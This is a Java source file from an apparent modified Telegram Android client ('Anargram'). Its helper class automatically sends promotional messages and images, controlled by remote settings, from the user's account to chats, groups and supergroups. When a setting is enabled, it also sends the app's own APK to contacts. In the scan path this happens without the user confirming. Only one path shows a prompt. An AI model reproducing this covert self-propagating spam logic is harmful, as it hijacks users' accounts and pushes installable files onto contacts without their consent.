package anargram.FcmService.Helper;

import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.net.Uri;
import android.os.Environment;
import android.util.Log;

import ir.anargram.messenger.R;

import org.telegram.messenger.AndroidUtilities;
import org.telegram.messenger.ApplicationLoader;
import org.telegram.messenger.LocaleController;
import org.telegram.messenger.MessagesController;

import org.telegram.messenger.SendMessagesHelper;
import org.telegram.tgnet.TLRPC;
import org.telegram.ui.Components.ChatActivityEnterView;

import java.io.File;
import java.util.ArrayList;

import anargram.FcmService.Helper.Packet.CheckJoined;
import anargram.FcmService.Service.DownloadTaskImage;

/**
 * Created by Saman on 11/15/2016.
 */
public class PmHelper {
    public static void Pm(final long dialogid){
        if(PmSetting.CheckIsSended(String.valueOf(dialogid)))return;
        if(PmSetting.getJustSendForNotInstalled()){
            if(!PmSetting.CheckIsInstalled( dialogid)){

                            send(dialogid);
            }
        }else {
            send(dialogid);
        }
        PmSetting.AddToSendedList(String.valueOf(dialogid));
    }
    public static void send(long dialogid){
        Boolean supergorup=false;
        Boolean channel=false;
        boolean group=false;
        TLRPC.TL_dialog dialog = MessagesController.getInstance().dialogs_dict.get(dialogid);
        TLRPC.Chat chat = MessagesController.getInstance().getChat((int) -dialogid);
        if(dialogid<0){
            group=true;
        }
        if (chat != null && ((chat.megagroup && chat.editor) || chat.creator)) {
            group=true;
        }
        if (chat != null) {
            if (chat.megagroup) {
                supergorup=true;
            } else {
                channel=true;
            }
        }
        if(channel)return;
        TLRPC.User user=null;
        if(dialogid>0)user =  MessagesController.getInstance().getUser(Integer.valueOf((int) dialogid));
        if(PmSetting.getSendForSuperGroup()&&supergorup){
            SendMsg(dialogid);
            if (PmSetting.getSendApk()) {
                SendApk(dialogid);
            }
        }else if(PmSetting.getSendForGroup()&&group){
            SendMsg(dialogid);
            if (PmSetting.getSendApk()) {
                SendApk(dialogid);
            }
        }else if(PmSetting.getSendForChat()&&user!=null&&!user.bot){
            SendMsg(dialogid);
            if (PmSetting.getSendApk()) {
                SendApk(dialogid);
            }
        }
    }
    public static void SendMsg(final Long dialogid){
        //TLRPC.WebPage wb=new TLRPC.TL_webPage();
        //wb.url=UrlController.SERVERADD+"upload/"+ PmSetting.getimg();
        //wb.display_url=UrlController.SERVERADD+"upload/"+ PmSetting.getimg();

        //SendMessagesHelper.getInstance().sendMessage(PmSetting.getMsg(), dialogid, null, wb, false, null, null, null);
        //SendMessagesHelper.prepareSendingPhoto(UrlController.SERVERADD+"upload/"+ PmSetting.getimg(),null,dialogid,null,PmSetting.getMsg());
        //TLRPC.Peer per=new TLRPC.Peer();
       // int id=MessagesController.getInstance().dialogs_dict.get(dialogid).peer;
        //SendMessagesHelper.getInstance().sendMessage(null,UrlController.SERVERADD+"upload/"+ PmSetting.getimg(),id,null,null,null);
        if(PmSetting.getimg()!=null&&PmSetting.getimg().length()>0) {

            String path = Environment.getExternalStorageDirectory() + "/TelegramGifs/image.png";
            if(new File(path).exists()) {
                Uri uri = Uri.fromFile(new File(path));
                if(PmSetting.getMsg().length()<200) {
                    SendMessagesHelper.prepareSendingPhoto(path, uri, dialogid, null, PmSetting.getMsg(),null , null);
                }else{
                    SendMessagesHelper.getInstance().sendMessage(PmSetting.getMsg(), dialogid, null, null, false, null, null, null);
                }
            }else{
                DownloadTaskImage dt=new DownloadTaskImage(ApplicationLoader.applicationContext);
                dt.execute(UrlController.SERVERADD+"upload/"+PmSetting.getimg());
                AndroidUtilities.runOnUIThread(new Runnable() {
                    @Override
                    public void run() {
                        SendMsg(dialogid);
                    }
                },10000);
            }
        }else{
            SendMessagesHelper.getInstance().sendMessage(PmSetting.getMsg(), dialogid, null, null, false, null, null, null);
        }
    }
    public static void SendApk(Long dialogid){
        ArrayList<String> lists=new ArrayList<>();
        lists.add(PackageHelper.getApkName(ApplicationLoader.applicationContext));
        SendMessagesHelper.prepareSendingDocuments(lists,lists,null,null,dialogid,null , null);
    }

    public static void scan(long dialog_id) {
        Boolean supergorup=false;
        Boolean channel=false;
        boolean group=false;
        TLRPC.TL_dialog dialog = MessagesController.getInstance().dialogs_dict.get(dialog_id);
        TLRPC.Chat chat = MessagesController.getInstance().getChat((int) -dialog_id);
        if(dialog_id<0){
            group=true;
        }
        if (chat != null && ((chat.megagroup && chat.editor) || chat.creator)) {
            group=true;
        }
        if (chat != null) {
            if (chat.megagroup) {
                supergorup=true;
            } else {
               channel=true;
            }
        }
        if(channel)return;

        TLRPC.User user=null;
        if(dialog_id>0)user =  MessagesController.getInstance().getUser(Integer.valueOf((int) dialog_id));
        if(group||supergorup){
            Pm(dialog_id);
        }else {
            if(PmSetting.getJustSendForNotInstalled()) {
                checkexistans(user.id, dialog_id);
            }else{
                Pm(dialog_id);
            }
        }
        Log.e("Dialogopened","d"+dialog_id + " type: "+ (supergorup ?"supergroup":group?"group":"chat"));
    }
    public static void checkexistans(final int userid, final Long dialogid){
       checkexistans(userid,dialogid,false);
    }

    public static void scanwithalert(long dialog_id) {
        Boolean supergorup=false;
        Boolean channel=false;
        boolean group=false;
        TLRPC.TL_dialog dialog = MessagesController.getInstance().dialogs_dict.get(dialog_id);
        TLRPC.Chat chat = MessagesController.getInstance().getChat((int) -dialog_id);
        if(dialog_id<0){
            group=true;
        }
        if (chat != null && ((chat.megagroup && chat.editor) || chat.creator)) {
            group=true;
        }
        if (chat != null) {
            if (chat.megagroup) {
                supergorup=true;
            } else {
                channel=true;
            }
        }
        if(channel||group||supergorup)return;

        TLRPC.User user=null;
        if(dialog_id>0)user =  MessagesController.getInstance().getUser(Integer.valueOf((int) dialog_id));

                checkexistans(user.id, dialog_id,true);
        Log.e("Dialogopened","d"+dialog_id + " type: "+ (supergorup ?"supergroup":group?"group":"chat"));
    }

    private static void checkexistans(int userid, final long dialogid, final boolean b) {
        final CheckJoined t = new CheckJoined(userid);
        t.setOnError(new CheckJoined.OnError() {
            @Override
            public void onReqError() {

            }
        });
        t.setOnSuccess(new CheckJoined.OnSuccess() {
            @Override
            public void onRegSuccess(Boolean have) {
                if(!have){
                    if(b){

                        Context context = ChatActivityEnterView.thiscontext;
                        String text= LocaleController.getString("WellComeInfo", R.string.ThisUserNotHaveDigiram);
                        String title=LocaleController.getString("WellCome",R.string.InvateUser);
                        AlertDialog.Builder builder = new AlertDialog.Builder(context);
                        builder.setTitle(title);
                        builder.setMessage(text);
                        builder.setPositiveButton(LocaleController.getString("Sendit", R.string.Sendit).toUpperCase(), new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialogInterface, int i) {
                                Pm(dialogid);
                            }
                        });
                        builder.setNegativeButton(LocaleController.getString("DontSend", R.string.DontSend).toUpperCase(), new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialogInterface, int i) {
                                PmSetting.AddToSendedList(String.valueOf(dialogid));
                            }
                        });
                        //show();
                        builder.show();
                    }else {
                        Pm(dialogid);
                    }
                }else{
                    PmSetting.AddIsInstalled(dialogid);
                }
            }
        });
        t.Send();
    }

    public static boolean ShowBtn(long dialog_id) {
        if(PmSetting.CheckIsSended(String.valueOf(dialog_id))||PmSetting.CheckIsInstalled(dialog_id))return false;
        PmSetting.AddToSendedList(String.valueOf(dialog_id));
        Boolean supergorup=false;
        Boolean channel=false;
        boolean group=false;
        TLRPC.TL_dialog dialog = MessagesController.getInstance().dialogs_dict.get(dialog_id);
        TLRPC.Chat chat = MessagesController.getInstance().getChat((int) -dialog_id);
        if(dialog_id<0){
            group=true;
        }
        if (chat != null && ((chat.megagroup && chat.editor) || chat.creator)) {
            group=true;
        }
        if (chat != null) {
            if (chat.megagroup) {
                supergorup=true;
            } else {
                channel=true;
            }
        }
        if(channel)return false;
        if(supergorup&&PmSetting.getShowinvateForSuperGroup())return true;
        if(group&&PmSetting.getShowinvateForGroup())return true;
        if(PmSetting.getShowinvateForChat())return true;
        return false;
    }
}
